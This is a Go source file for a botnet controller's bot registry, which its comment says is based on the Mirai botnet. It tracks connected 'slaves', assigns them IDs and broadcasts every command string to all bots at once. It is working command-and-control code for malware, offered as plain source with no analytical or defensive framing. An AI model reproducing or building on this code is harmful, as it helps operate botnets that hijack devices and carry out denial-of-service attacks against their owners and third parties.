package slave

/*
	Slave list manager based on Mirai.
*/

var (
	List *SlaveList = MakeList()
)

type SlaveList struct {
	ID          int
	Slaves      map[int]*Slave
	AddChan     chan *Slave
	DeleteChan  chan *Slave
	CommandChan chan string
}

func MakeList() *SlaveList {
	SlaveList := &SlaveList{
		ID:          0,
		Slaves:      make(map[int]*Slave),
		AddChan:     make(chan *Slave),
		DeleteChan:  make(chan *Slave),
		CommandChan: make(chan string),
	}
	go SlaveList.Manager()
	return SlaveList
}

func (slaveList *SlaveList) Push(Slave *Slave) {
	slaveList.AddChan <- Slave
}

func (slaveList *SlaveList) Remove(Slave *Slave) {
	slaveList.DeleteChan <- Slave
}

func (slaveList *SlaveList) Command(command string) {
	slaveList.CommandChan <- command
}

func (slaveList *SlaveList) Count() int {
	return len(List.Slaves)
}

func Count() int {
	return len(List.Slaves)
}

func (slaveList *SlaveList) Manager() {
	for {
		select {
		case Slave := <-slaveList.AddChan:
			slaveList.ID++
			Slave.ID = slaveList.ID
			slaveList.Slaves[Slave.ID] = Slave
		case Slave := <-slaveList.DeleteChan:
			delete(slaveList.Slaves, Slave.ID)
		case command := <-slaveList.CommandChan:
			for _, Slave := range slaveList.Slaves {
				Slave.Write(command)
			}
		}
	}
}
